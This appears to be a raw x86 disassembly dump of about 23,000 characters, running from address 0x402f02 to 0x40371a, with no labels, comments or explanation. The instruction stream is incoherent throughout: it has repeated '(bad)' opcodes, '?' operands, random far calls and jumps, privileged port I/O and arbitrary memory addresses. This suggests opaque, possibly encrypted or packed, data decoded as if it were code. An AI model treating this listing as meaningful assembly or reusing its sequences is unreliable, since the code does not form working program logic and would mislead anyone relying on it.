  402f02:	mov    dh,0x91
  402f04:	mov    bl,0x1
  402f06:	loope  0x402eac
  402f08:	mov    ds:0x92245105,eax
  402f0d:	inc    ebp
  402f0e:	push   eax
  402f0f:	test   al,0x1
  402f11:	pop    ecx
  402f12:	xor    DWORD PTR [eax+0x5c],ecx
  402f15:	dec    eax
  402f16:	call   0xb2de:0x232cc6da
  402f1d:	xchg   ecx,eax
  402f1e:	inc    edx
  402f1f:	push   0xffffffae
  402f21:	mov    WORD PTR [eax-0x370085a9],gs
  402f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f28:	fld    DWORD PTR [edi+eax*2]
  402f2b:	retf   0xf453
  402f2e:	out    0x88,al
  402f30:	add    BYTE PTR [ecx+0x5e583143],0xaf
  402f37:	mov    ebx,0xa75e50cf
  402f3c:	lock adc BYTE PTR [ebp+0x3a],0xa
  402f41:	pop    edi
  402f42:	cdq    
  402f43:	inc    ebx
  402f44:	ins    BYTE PTR es:[edi],dx
  402f45:	sbb    DWORD PTR [ebx-0x1f14e3da],eax
  402f4b:	mov    dh,0x2e
  402f4d:	sbb    DWORD PTR [ebp-0x13],ecx
  402f50:	cdq    
  402f51:	or     al,al
  402f53:	mov    edx,0xb9289319
  402f58:	push   edx
  402f59:	dec    edi
  402f5a:	nop
  402f5b:	and    eax,0x6b73b79e
  402f60:	mov    eax,ds:0x96729a9e
  402f65:	test   eax,0xb2911b9
  402f6a:	xchg   esp,eax
  402f6b:	bound  ecx,QWORD PTR [eax]
  402f6d:	pushf  
  402f6e:	ror    BYTE PTR [eax],1
  402f70:	adc    al,0x68
  402f72:	call   0x88e7:0x7fc44ba8
  402f79:	or     dl,BYTE PTR [esi-0x59]
  402f7c:	ds or  eax,0x125d62b0
  402f82:	push   0x5c
  402f84:	scas   eax,DWORD PTR es:[edi]
  402f85:	xchg   ebx,eax
  402f86:	xor    eax,0x9adbda0d
  402f8b:	pop    edx
  402f8c:	mov    ebx,0x8b38e800
  402f91:	inc    ebx
  402f92:	adc    DWORD PTR [edi-0x10df8ec],esp
  402f98:	and    DWORD PTR [esi],edx
  402f9a:	shr    BYTE PTR [edi+0x16e7bc9a],0xb2
  402fa1:	nop
  402fa2:	and    eax,0xaf09852b
  402fa7:	cld    
  402fa8:	aam    0xb
  402faa:	cmp    BYTE PTR [edi+0x26a99ca7],al
  402fb0:	mov    eax,0xa40f9597
  402fb5:	(bad)  
  402fb6:	xchg   ebp,eax
  402fb7:	pop    es
  402fb8:	jns    0x402f7d
  402fba:	std    
  402fbb:	dec    edx
  402fbc:	out    0x15,eax
  402fbe:	in     al,dx
  402fbf:	xor    ch,BYTE PTR ds:0x3dab1a71
  402fc5:	pop    edx
  402fc6:	adc    al,0x3a
  402fc8:	xchg   DWORD PTR [ecx-0x66],edx
  402fcb:	add    DWORD PTR [ebx+0x7e11a57],edx
  402fd1:	hlt    
  402fd2:	and    al,0xa7
  402fd4:	icebp  
  402fd5:	add    BYTE PTR [edx-0x27f89a83],0x6
  402fdc:	mov    ebp,0xb97f4a43
  402fe1:	mov    DWORD PTR [edi-0x27],edi
  402fe4:	test   BYTE PTR [ebx-0x7f],ch
  402fe7:	adc    DWORD PTR [ecx],0xb
  402fea:	push   ecx
  402feb:	fstp   QWORD PTR [ecx]
  402fed:	push   ss
  402fee:	retf   
  402fef:	dec    ecx
  402ff0:	mov    ds:0xec619aa5,eax
  402ff5:	(bad)  [edi+edx*2-0x58ca7fce]
  402ffc:	mov    cl,0x8a
  402ffe:	(bad)  
  402fff:	into   
  403000:	mov    al,ds:0xb23a595e
  403005:	and    al,0x8d
  403007:	mov    ebp,0x3ec129d9
  40300c:	(bad)  
  40300d:	or     al,0x4f
  40300f:	cmp    edi,DWORD PTR [edi+0x5e17daa2]
  403015:	mov    edx,0x3d8946be
  40301a:	pop    edx
  40301b:	daa    
  40301c:	fwait
  40301d:	scas   eax,DWORD PTR es:[edi]
  40301e:	xor    eax,0x4eb195f5
  403023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403024:	mov    bh,0xce
  403026:	into   
  403027:	ret    
  403028:	outs   dx,DWORD PTR ds:[esi]
  403029:	xchg   ebp,eax
  40302a:	cmp    dh,BYTE PTR [edi+0xf]
  40302d:	dec    edx
  40302e:	xchg   ebp,eax
  40302f:	sub    al,0x4
  403031:	sbb    DWORD PTR [ebp+0x6b0b22c9],esi
  403037:	sub    dl,dl
  403039:	sbb    BYTE PTR [esi-0x60],0x1a
  40303d:	stc    
  40303e:	mov    al,0x60
  403040:	dec    ebp
  403041:	mov    ds:0x7eba741a,al
  403046:	and    BYTE PTR es:[edx-0x57ee8d55],dh
  40304d:	pop    ecx
  40304e:	cmp    esp,DWORD PTR [edx-0x5f1d14f1]
  403054:	mov    ds:0xc0976457,al
  403059:	fisttp DWORD PTR [ecx-0x65916a40]
  40305f:	push   ebp
  403060:	jb     0x40305d
  403062:	and    ebx,DWORD PTR [edi+0x2]
  403065:	mov    cl,0x85
  403067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403068:	ja     0x40304c
  40306a:	out    dx,eax
  40306b:	jbe    0x403051
  40306d:	mov    BYTE PTR [ebx+0x23],dh
  403070:	pop    esi
  403071:	fdivr  QWORD PTR [edx+0x37]
  403074:	jae    0x4030af
  403076:	call   0xdbab:0x2c446847
  40307d:	mov    esp,0xd912a7f8
  403082:	cmp    eax,0x1b41f23f
  403088:	mov    dl,0x33
  40308a:	scas   eax,DWORD PTR es:[edi]
  40308b:	mov    ebx,0xac2fb122
  403090:	push   ds
  403091:	or     edx,DWORD PTR [esi+esi*2]
  403094:	and    BYTE PTR [esi-0x7625d5b3],0x95
  40309b:	push   es
  40309c:	jecxz  0x4030da
  40309e:	rol    DWORD PTR [edi-0x7f],0x14
  4030a2:	sub    al,0xc
  4030a4:	addr16 or esp,ecx
  4030a7:	mov    DWORD PTR [edi-0x2dcc5c44],ebx
  4030ad:	test   al,0x66
  4030af:	mov    cl,0x8e
  4030b1:	mov    ch,bh
  4030b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030b4:	xchg   ecx,eax
  4030b5:	or     esi,0x7af48614
  4030bb:	hlt    
  4030bc:	scas   al,BYTE PTR es:[edi]
  4030bd:	mov    ds:0x354ca774,eax
  4030c2:	cli    
  4030c3:	out    0x66,al
  4030c5:	pusha  
  4030c6:	jb     0x4030d0
  4030c8:	mov    dl,0xc5
  4030ca:	ja     0x403149
  4030cc:	ss cwde 
  4030ce:	mov    eax,0xa757f779
  4030d3:	popa   
  4030d4:	mov    dl,0x8d
  4030d6:	leave  
  4030d7:	xchg   ecx,eax
  4030d8:	aas    
  4030d9:	lods   al,BYTE PTR ds:[esi]
  4030da:	or     eax,0xa148c1a5
  4030df:	jle    0x4030cb
  4030e1:	mov    esi,DWORD PTR [esi+ebp*4+0x5f]
  4030e5:	aam    0xca
  4030e7:	inc    edx
  4030e8:	push   esi
  4030e9:	or     eax,0xa9887250
  4030ee:	inc    edi
  4030ef:	lahf   
  4030f0:	mov    dl,0x9c
  4030f2:	or     bl,BYTE PTR [esi]
  4030f4:	shl    cl,0x1e
  4030f7:	fdiv   st,st(1)
  4030f9:	or     esi,DWORD PTR [eax+eax*1-0x752b7615]
  403100:	mov    edx,0x8479a55
  403105:	lock sbb ebp,0xa4439daa
  40310c:	xchg   esp,esi
  40310e:	imul   esi,DWORD PTR [esi-0x41],0xecb552e8
  403115:	lahf   
  403116:	xchg   ebx,eax
  403117:	shl    DWORD PTR [ebp-0x5a],cl
  40311a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311b:	daa    
  40311c:	pop    esi
  40311d:	(bad)  
  40311e:	dec    ecx
  40311f:	push   0x3
  403121:	or     ecx,DWORD PTR [edi-0x62fbb702]
  403127:	jmp    0x9d9c:0xc39db750
  40312e:	std    
  40312f:	adc    eax,0xb9d1aae2
  403134:	jg     0x403141
  403136:	rol    DWORD PTR [edx-0x4c9fa33b],0xb1
  40313d:	jb     0x4030d9
  40313f:	addr16 pop edi
  403141:	add    BYTE PTR [esi],ch
  403143:	popa   
  403144:	inc    edi
  403145:	mov    cl,0xca
  403147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403148:	sbb    al,0x24
  40314a:	popa   
  40314b:	fbld   TBYTE PTR fs:[edx]
  40314e:	push   edx
  40314f:	daa    
  403150:	mov    dh,0x3c
  403152:	mov    al,ds:0x30b3bb97
  403157:	fwait
  403158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403159:	or     esp,DWORD PTR [edx-0x38]
  40315c:	ss pop ds
  40315e:	mul    ecx
  403160:	ins    BYTE PTR es:[edi],dx
  403161:	jb     0x403170
  403163:	mov    edx,0x27e26834
  403168:	mov    ebx,0xa83f46a7
  40316d:	add    esp,DWORD PTR [esi+ebp*2-0x40]
  403171:	mov    ebp,0x880f1ca2
  403176:	pop    edi
  403177:	dec    edx
  403178:	scas   eax,DWORD PTR es:[edi]
  403179:	and    cl,bl
  40317b:	pop    es
  40317c:	bound  ebp,QWORD PTR [edx]
  40317e:	pop    edx
  40317f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403180:	xchg   esi,eax
  403181:	mov    cl,0x6a
  403183:	cmp    eax,0x5a337c5
  403188:	mov    bh,0xec
  40318a:	imul   esi,DWORD PTR [edi-0x11a25a35],0x6aca0879
  403194:	sbb    bl,dh
  403196:	add    DWORD PTR [ebx+0x62],eax
  403199:	stc    
  40319a:	push   ecx
  40319b:	mov    al,ds:0xcfb5b5ce
  4031a0:	fisttp DWORD PTR [ebx+0x62]
  4031a3:	xchg   esp,eax
  4031a4:	mov    DWORD PTR [edx-0x63],0xe5fe3dca
  4031ab:	(bad)  
  4031ac:	xchg   edx,eax
  4031ad:	test   DWORD PTR [edi+0x90afc10],esp
  4031b3:	mov    gs,esi
  4031b5:	adc    BYTE PTR [edi],0xe5
  4031b8:	dec    esi
  4031ba:	jns    0x403153
  4031bc:	cmp    DWORD PTR [ebp-0x66],0x9d9f9327
  4031c3:	pop    esi
  4031c4:	and    eax,0x40a77cd9
  4031c9:	and    dl,bh
  4031cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031cc:	adc    BYTE PTR [esi+edi*1+0x2],cl
  4031d0:	(bad)  
  4031d1:	stos   DWORD PTR es:[edi],eax
  4031d2:	call   0x460c:0x25564450
  4031d9:	aas    
  4031da:	xor    bl,BYTE PTR [esi-0x2f771643]
  4031e0:	cmp    cl,BYTE PTR [ebx]
  4031e2:	clc    
  4031e3:	pushf  
  4031e4:	retf   0x8c42
  4031e7:	data16 mov dl,0x12
  4031ea:	pop    ss
  4031eb:	loop   0x4031fb
  4031ed:	cdq    
  4031ee:	xor    al,0xe4
  4031f0:	push   ebp
  4031f1:	or     bh,ah
  4031f3:	adc    esp,DWORD PTR [esi+ebx*4]
  4031f6:	xor    ch,dh
  4031f8:	xor    al,0xcf
  4031fa:	xchg   BYTE PTR [esi],dl
  4031fc:	mov    WORD PTR [edx+0x2f],ds
  4031ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403200:	mov    esi,0x1f79616c
  403205:	mov    ebx,0x51daa721
  40320a:	out    0x24,eax
  40320c:	inc    edi
  40320d:	(bad)  
  40320e:	jbe    0x403275
  403210:	lods   eax,DWORD PTR ds:[esi]
  403211:	mov    bh,0xc4
  403213:	ins    DWORD PTR es:[edi],dx
  403214:	jne    0x4031c1
  403216:	icebp  
  403217:	mov    edx,0x265d86c2
  40321c:	pusha  
  40321d:	or     ebp,esi
  40321f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403220:	add    edi,edi
  403222:	fidivr WORD PTR [edi-0x5f650e11]
  403228:	mov    edi,0xc4ba4c71
  40322d:	sub    al,0xc8
  40322f:	fwait
  403230:	(bad)  
  403231:	ins    BYTE PTR es:[edi],dx
  403232:	call   0x8f2d:0x28a6b111
  403239:	sbb    esp,DWORD PTR [edx-0x2074267a]
  40323f:	jl     0x403259
  403241:	outs   dx,BYTE PTR ds:[esi]
  403242:	jne    0x40323e
  403244:	cld    
  403245:	or     ecx,edi
  403247:	add    BYTE PTR [edi],dh
  403249:	imul   ebp,edx,0x95c8519c
  40324f:	jmp    0x97d9:0x27d2522a
  403256:	inc    eax
  403257:	data16 sbb cl,BYTE PTR [ebx]
  40325a:	xchg   esi,eax
  40325b:	bound  esp,QWORD PTR [ebx]
  40325d:	retf   
  40325e:	xor    DWORD PTR [ebx-0xb12322f],edx
  403264:	pop    ecx
  403265:	out    dx,eax
  403266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403267:	das    
  403268:	mov    dl,0xc1
  40326a:	repnz ficomp DWORD PTR [esi-0x2d]
  40326e:	adc    al,0xc7
  403270:	lds    eax,FWORD PTR [ebx+ebx*4]
  403273:	sbb    dh,cl
  403275:	leave  
  403276:	cli    
  403277:	mov    dh,al
  403279:	sbb    DWORD PTR [edx],0xfffffff2
  40327c:	scas   al,BYTE PTR es:[edi]
  40327d:	adc    DWORD PTR ds:0x23453d85,0x5a56b23b
  403287:	(bad)  
  403288:	mov    edi,0x4dd0d88a
  40328d:	or     ebp,DWORD PTR [esi-0x5a01c173]
  403293:	sub    DWORD PTR ds:0xe280a6bf,ebp
  403299:	mov    edi,DWORD PTR [edx-0x3]
  40329c:	sbb    BYTE PTR [edi+0x7f124e62],ah
  4032a2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4032a4:	xlat   BYTE PTR ds:[ebx]
  4032a5:	je     0x403292
  4032a7:	fadd   QWORD PTR [eax-0x2a]
  4032aa:	inc    edx
  4032ab:	push   edi
  4032ac:	push   esp
  4032ad:	fcomp  QWORD PTR [edx+0x5061ada6]
  4032b3:	ins    BYTE PTR es:[edi],dx
  4032b4:	mov    edx,0x90bb3cfe
  4032b9:	mov    ss,WORD PTR [ebp-0x59]
  4032bc:	inc    esi
  4032bd:	xor    dh,BYTE PTR [edx-0x28]
  4032c0:	pop    eax
  4032c1:	test   BYTE PTR [ebx+0x2e713518],dl
  4032c7:	daa    
  4032c8:	or     bh,0x7f
  4032cb:	mov    edi,0xa7dcfb18
  4032d0:	add    eax,0xb4d2dd48
  4032d5:	inc    edi
  4032d6:	(bad)  
  4032d8:	mov    dl,0xe1
  4032da:	mov    cl,0xf
  4032dc:	out    dx,eax
  4032dd:	enter  0x3a94,0xe5
  4032e1:	xor    DWORD PTR [ebx-0x18],ebx
  4032e4:	push   cs
  4032e5:	adc    bl,BYTE PTR [edx]
  4032e7:	je     0x4032df
  4032e9:	push   ds
  4032ea:	pop    ds
  4032eb:	xor    bh,BYTE PTR [esi+0xe]
  4032ee:	call   0x6e23:0xa54dcba6
  4032f5:	bound  edx,QWORD PTR [ebx-0x59]
  4032f8:	xor    al,BYTE PTR [edx]
  4032fa:	xor    eax,0xf8e95c33
  4032ff:	cs mov ebp,0x59b4d39
  403305:	ins    BYTE PTR es:[edi],dx
  403306:	fcomip st,st(1)
  403308:	push   edx
  403309:	xor    BYTE PTR [ebx+0x3f],dl
  40330c:	cwde   
  40330d:	or     edi,DWORD PTR [edx+0x4555be2a]
  403313:	jle    0x403298
  403315:	std    
  403316:	test   ecx,edx
  403318:	cmp    ch,ah
  40331a:	sbb    eax,0x7adafb06
  40331f:	fisttp WORD PTR [edx-0x6c583bd4]
  403325:	sub    eax,0x8aa0a6ef
  40332a:	mov    ch,0xf4
  40332c:	rcl    BYTE PTR [eax-0x67],0x56
  403330:	dec    edx
  403331:	popa   
  403332:	xchg   edi,eax
  403333:	jecxz  0x4032f6
  403335:	xchg   edx,eax
  403336:	add    DWORD PTR [eax+0x65],0x6f4239db
  40333d:	xor    edi,eax
  40333f:	jne    0x403373
  403341:	arpl   dx,di
  403343:	paddsb mm4,QWORD PTR [edi-0x16]
  403347:	jno    0x4032fa
  403349:	adc    dh,bh
  40334b:	int3   
  40334c:	jne    0x40339a
  40334e:	dec    ebp
  40334f:	aas    
  403350:	sbb    eax,0xe1a78ddb
  403355:	xchg   esp,eax
  403356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403357:	xchg   esp,eax
  403358:	(bad)  
  403359:	and    DWORD PTR [esi],ecx
  40335b:	gs mov ch,0x3d
  40335e:	iret   
  40335f:	jbe    0x403304
  403361:	sbb    edi,DWORD PTR [edi+0x7a21336c]
  403367:	and    dl,BYTE PTR [edx-0x63586b4d]
  40336d:	pop    edi
  40336e:	mov    edi,DWORD PTR ss:[ebp-0x6d]
  403372:	xlat   BYTE PTR ds:[ebx]
  403373:	cmp    esi,DWORD PTR [ebp+0x74f7ea04]
  403379:	xor    DWORD PTR [edx+0x53],ebp
  40337c:	out    dx,al
  40337d:	pop    esp
  40337e:	and    DWORD PTR [ebx+0x7a2199e9],ebx
  403384:	xor    esi,DWORD PTR [esi+0x75]
  403387:	or     DWORD PTR [edi-0x8],esi
  40338a:	and    eax,0x9b0e2567
  40338f:	je     0x4033fb
  403391:	sbb    eax,0xa88fd2ee
  403396:	jbe    0x4033d7
  403398:	push   ebp
  403399:	dec    DWORD PTR [edi+0x1d6e0c9a]
  40339f:	push   eax
  4033a0:	push   ecx
  4033a1:	mov    edx,0xddf4f70c
  4033a6:	test   DWORD PTR [ebx-0x4b],eax
  4033a9:	dec    esp
  4033aa:	dec    edx
  4033ab:	xchg   DWORD PTR [edi+eax*1-0x3f3bda76],esp
  4033b2:	mov    ds:0x64964db1,eax
  4033b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033b8:	(bad)  
  4033b9:	shr    DWORD PTR [ebp-0x66e0dc71],cl
  4033bf:	or     ah,cl
  4033c1:	mov    edx,0xab4a71d5
  4033c6:	ss leave 
  4033c8:	sbb    eax,0x90a7077b
  4033cd:	or     eax,0x72cf845
  4033d2:	xor    al,0xdb
  4033d4:	xchg   esi,eax
  4033d5:	(bad)  
  4033d6:	adc    eax,0x8759b28f
  4033db:	adc    BYTE PTR [ebx+0x285b3528],dl
  4033e1:	push   ss
  4033e2:	sbb    bh,BYTE PTR [ecx+0x7]
  4033e5:	mov    ebx,edi
  4033e7:	push   cs
  4033e8:	shr    BYTE PTR [esi+0x4b08986],cl
  4033ee:	adc    eax,0x997c3fca
  4033f3:	data16 arpl WORD PTR [ebx+0x72],si
  4033f7:	adc    DWORD PTR [ebx],ebx
  4033f9:	or     esp,DWORD PTR [edi+0x12e44d40]
  4033ff:	scas   eax,DWORD PTR es:[edi]
  403400:	sbb    eax,0x2af49a39
  403405:	fldenv [edx-0x5980b3b]
  40340b:	mov    ecx,0x67a00cc0
  403410:	xchg   esp,eax
  403411:	push   eax
  403412:	push   esi
  403413:	arpl   WORD PTR [eax+0x3c],dx
  403416:	call   0xf1d9:0x16031749
  40341d:	ins    BYTE PTR es:[edi],dx
  40341e:	cmp    DWORD PTR [ebx-0x6e65282a],ebx
  403424:	push   esp
  403425:	push   ss
  403426:	jns    0x40343c
  403428:	xchg   esi,eax
  403429:	call   FWORD PTR [ecx-0x2e6051c0]
  40342f:	mov    ebp,0xbf659316
  403434:	or     eax,DWORD PTR cs:[ebp+esi*4+0x2d0b3251]
  40343c:	dec    esi
  40343d:	jge    0x4033d8
  40343f:	cdq    
  403440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403441:	mov    eax,ds:0xbb04fd33
  403446:	pusha  
  403447:	xchg   ebp,eax
  403448:	mov    ds:0xa05d8d77,al
  40344d:	or     ch,BYTE PTR [ebx]
  40344f:	pusha  
  403450:	test   al,0x86
  403452:	mov    dl,0x24
  403454:	adc    ebx,eax
  403456:	repz push cs
  403458:	mov    dl,0x9c
  40345a:	stos   DWORD PTR es:[edi],eax
  40345b:	(bad)  
  40345c:	xchg   al,dh
  40345e:	xchg   esi,eax
  40345f:	aaa    
  403460:	lock or eax,esp
  403463:	out    0x64,al
  403465:	jno    0x40348b
  403467:	mov    ch,0x7a
  403469:	ss call 0x6e31:0x6e8647e9
  403471:	dec    eax
  403472:	or     BYTE PTR [edi+0x6abe6167],ah
  403478:	xchg   edx,eax
  403479:	mov    BYTE PTR [ebp+0x63d4cc29],al
  40347f:	pop    edi
  403480:	dec    ecx
  403481:	rcr    BYTE PTR [edx-0x3f33b2c5],1
  403487:	test   DWORD PTR [ebp-0x33],esp
  40348a:	jb     0x403433
  40348c:	out    0x2c,eax
  40348e:	pusha  
  40348f:	cmp    eax,0xf66a2a1b
  403494:	mov    dl,0x0
  403496:	cmp    edx,DWORD PTR [esi+0x1d2bd410]
  40349c:	clc    
  40349d:	add    eax,0x5374ce7d
  4034a2:	call   0x8845:0x929b8c39
  4034a9:	sbb    edi,DWORD PTR [edi-0x5a432bd9]
  4034af:	mov    ah,0x70
  4034b1:	loopne 0x4034aa
  4034b3:	mov    al,ds:0x2b63a62d
  4034b8:	xor    eax,0xf913cc7a
  4034bd:	imul   esp,esi,0xffffffcc
  4034c0:	ret    
  4034c1:	call   FWORD PTR [edx-0x7b48a4bc]
  4034c7:	adc    ch,BYTE PTR [ebp+0x61a7ac12]
  4034cd:	(bad)
  4034d0:	adc    DWORD PTR cs:[esp+ebp*4-0x3560c6a4],0x63
  4034d9:	inc    esp
  4034da:	push   edi
  4034db:	jl     0x40350e
  4034dd:	fcom   DWORD PTR [esi+0x7c]
  4034e0:	test   ebx,eax
  4034e2:	icebp  
  4034e3:	enter  0xb16,0xfe
  4034e7:	mov    WORD PTR [edi+0x6617398b],gs
  4034ed:	xchg   esi,eax
  4034ee:	fwait
  4034ef:	dec    edi
  4034f0:	leave  
  4034f1:	aas    
  4034f2:	jecxz  0x40356d
  4034f4:	adc    bh,dh
  4034f6:	jb     0x4034a9
  4034f8:	fmul   QWORD PTR [eax]
  4034fa:	mov    ?,ecx
  4034fc:	out    dx,al
  4034fd:	fisub  WORD PTR [edi]
  4034ff:	enter  0x1332,0xe4
  403503:	ss scas al,BYTE PTR es:[edi]
  403505:	(bad)  
  403506:	aas    
  403507:	std    
  403508:	mov    dl,0xc8
  40350a:	xchg   ebp,eax
  40350b:	stos   DWORD PTR es:[edi],eax
  40350c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40350d:	adc    al,0x54
  40350f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403510:	cdq    
  403511:	xor    al,0xc2
  403513:	jb     0x4034c5
  403515:	and    al,0xb9
  403517:	mov    edi,0xc2ac66a1
  40351c:	mov    dl,0x7a
  40351e:	(bad)  
  40351f:	div    DWORD PTR [eax+esi*2]
  403522:	in     al,dx
  403523:	dec    edi
  403524:	fwait
  403525:	or     edi,DWORD PTR [esi-0x1c77821e]
  40352b:	adc    dl,ch
  40352d:	stos   BYTE PTR es:[edi],al
  40352e:	call   0x8e8a:0x62f5327f
  403535:	xor    eax,0xe36ba730
  40353a:	shl    dh,1
  40353c:	sti    
  40353d:	sub    bh,BYTE PTR [ebp-0x25ac4d5d]
  403543:	jg     0x4035c0
  403545:	cmp    eax,0x8d8d0e4
  40354a:	shr    BYTE PTR [ebp+0x7e],0xbe
  40354e:	push   ss
  40354f:	push   esi
  403550:	or     cl,BYTE PTR [edi+ecx*4-0x2b3f777f]
  403557:	(bad)  [edx-0xf732855]
  40355d:	mov    eax,ds:0xba80b96
  403562:	pusha  
  403563:	and    BYTE PTR [edx+esi*2],0xfc
  403567:	mov    ecx,DWORD PTR [esi-0x4f3a65cc]
  40356d:	mov    DWORD PTR [ebx+edi*8-0x58f82709],esp
  403574:	(bad)  
  403575:	std    
  403576:	xor    BYTE PTR [eax],ah
  403578:	(bad)  
  403579:	leave  
  40357a:	and    DWORD PTR [ebx-0x4b],edx
  40357d:	xchg   edx,eax
  40357e:	cmp    eax,0x49f4cdb9
  403583:	cmp    al,0xb6
  403585:	repz mov dl,0xcf
  403588:	lock jns 0x4035c9
  40358b:	fld    TBYTE PTR [ebp+0x7aad560b]
  403591:	mov    ds:0x610e056a,al
  403596:	call   0xe58c:0xcb2dee6c
  40359d:	jns    0x40361c
  40359f:	mov    al,ds:0xd3d6b3e4
  4035a4:	adc    bl,BYTE PTR [ebx+0x7a311034]
  4035aa:	mov    ds:0x840bf9a6,al
  4035af:	and    edi,ebx
  4035b1:	dec    edi
  4035b2:	xor    eax,0x590b3991
  4035b7:	inc    ebp
  4035b8:	mov    eax,ds:0x2a435624
  4035bd:	or     DWORD PTR [edx+0x62d879d4],ebx
  4035c3:	mov    edi,gs
  4035c5:	xchg   edi,eax
  4035c6:	mov    ds:0x1b854e5c,eax
  4035cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035cc:	pop    ss
  4035cd:	jp     0x4035f9
  4035cf:	sbb    BYTE PTR [ecx-0x4da56747],ch
  4035d5:	cmp    edi,esp
  4035d7:	test   al,0xd7
  4035d9:	xlat   BYTE PTR ds:[ebx]
  4035da:	xor    eax,0x730b2bc7
  4035df:	enter  0x94c8,0xe8
  4035e3:	out    dx,al
  4035e4:	(bad)  
  4035e5:	fisub  WORD PTR [esi+0x4]
  4035e8:	pop    esi
  4035e9:	call   FWORD PTR [edx-0x4a24f9cd]
  4035ef:	add    BYTE PTR [ebp-0x3a],cl
  4035f2:	enter  0x6ca6,0x97
  4035f6:	sub    DWORD PTR [ecx+esi*8],ecx
  4035f9:	jno    0x4035e3
  4035fb:	mov    eax,0xf2259abe
  403601:	sbb    eax,0x85e7acca
  403606:	xchg   DWORD PTR [edi+0x4365ee2b],esp
  40360c:	fild   QWORD PTR [edi+eiz*4]
  40360f:	xor    al,0xbc
  403611:	push   ebx
  403612:	pushf  
  403613:	add    BYTE PTR [esi+0x2986cd4b],ah
  403619:	(bad)  
  40361a:	fldenv [edi-0x1583d684]
  403620:	data16 xor ah,ah
  403623:	arpl   WORD PTR [edx-0x5ee463e9],si
  403629:	fidivr WORD PTR [ecx+0x7e773e19]
  40362f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403630:	sub    esp,DWORD PTR [eax]
  403632:	test   eax,0x3b0741e6
  403637:	xchg   BYTE PTR [edx+0x152f438e],dh
  40363d:	xor    ebx,ecx
  40363f:	mov    esp,0x75180b38
  403644:	or     bl,BYTE PTR [esi+0x13]
  403647:	test   eax,0x5a6690c5
  40364c:	mov    ecx,0xf6be4e8a
  403651:	mov    ds,WORD PTR [edi+0x6]
  403654:	mov    ebp,0xe30792e9
  403659:	push   ebx
  40365a:	xchg   ecx,eax
  40365b:	mov    al,BYTE PTR [ebp-0x7bb2c9f5]
  403661:	and    DWORD PTR [eax],esi
  403663:	aad    0xb8
  403665:	xchg   ebx,eax
  403666:	lahf   
  403667:	mov    esp,0xc7db805e
  40366c:	jno    0x4036a4
  40366e:	mov    WORD PTR [esi+eiz*8],?
  403671:	jecxz  0x403664
  403673:	bound  ebp,QWORD PTR [esi]
  403675:	or     ecx,DWORD PTR [edi]
  403677:	and    al,0x56
  403679:	inc    esi
  40367a:	inc    esi
  40367b:	pop    es
  40367c:	in     eax,0x13
  40367e:	mov    BYTE PTR [esi+ebx*2+0x1ca71443],0xa3
  403686:	pop    edx
  403687:	std    
  403688:	scas   al,BYTE PTR es:[edi]
  403689:	jmp    0x4036c8
  40368b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40368c:	pop    es
  40368d:	fcom   DWORD PTR [ecx]
  40368f:	and    BYTE PTR ss:[edx],0x0
  403693:	jnp    0x403655
  403695:	mov    dh,0x95
  403697:	push   si
  403699:	push   ebp
  40369a:	stos   DWORD PTR es:[edi],eax
  40369b:	(bad)  
  40369c:	mov    BYTE PTR [eax+0xb2add8c],dl
  4036a2:	adc    al,0x6a
  4036a4:	in     eax,0xf9
  4036a6:	sbb    BYTE PTR [edi],ch
  4036a8:	inc    esi
  4036a9:	jecxz  0x403645
  4036ab:	mov    bl,0xac
  4036ad:	xor    al,0xbb
  4036af:	xor    al,0x34
  4036b1:	and    DWORD PTR [ecx-0x59],edx
  4036b4:	push   ebp
  4036b5:	xchg   esp,eax
  4036b6:	cmp    edx,0xf1ea1169
  4036bc:	mov    dl,0x57
  4036be:	sbb    ebp,DWORD PTR [ecx]
  4036c0:	mov    cl,BYTE PTR [edi]
  4036c2:	push   ebx
  4036c3:	ret    
  4036c4:	xchg   ebx,eax
  4036c5:	or     ah,BYTE PTR [esi]
  4036c7:	or     ecx,DWORD PTR [ebp+ebp*4-0xf]
  4036cb:	sub    eax,0x452beb42
  4036d0:	mov    ch,0x8c
  4036d2:	inc    ebp
  4036d3:	(bad)  
  4036d4:	cdq    
  4036d5:	(bad)  
  4036d6:	mov    edx,0x29b998b7
  4036db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036dc:	pop    edi
  4036dd:	test   al,0xbd
  4036df:	cs test al,0xbd
  4036e2:	test   BYTE PTR [esi-0x73],0x55
  4036e6:	cmc    
  4036e7:	pop    ebp
  4036e8:	mov    BYTE PTR [ecx-0x7f9358ae],dh
  4036ee:	mov    ?,edi
  4036f0:	jne    0x4036d2
  4036f2:	or     ah,BYTE PTR [edi-0x19fb548d]
  4036f8:	mov    bh,0x2a
  4036fa:	pusha  
  4036fb:	xchg   ebx,eax
  4036fc:	mov    dl,0xc
  4036fe:	test   al,0x59
  403700:	mov    ebx,DWORD PTR [ecx-0x4a]
  403703:	fnsave [edi]
  403705:	or     ecx,DWORD PTR [ebx]
  403707:	mov    eax,ds:0x4d49afc0
  40370c:	cli    
  40370d:	inc    eax
  40370e:	in     al,dx
  40370f:	ja     0x4036c3
  403711:	adc    DWORD PTR [esi+ecx*8-0x330ad5f3],esp
  403718:	xor    ecx,DWORD PTR [edx]
  40371a:	mov    ds:0xccc9b3d8,al
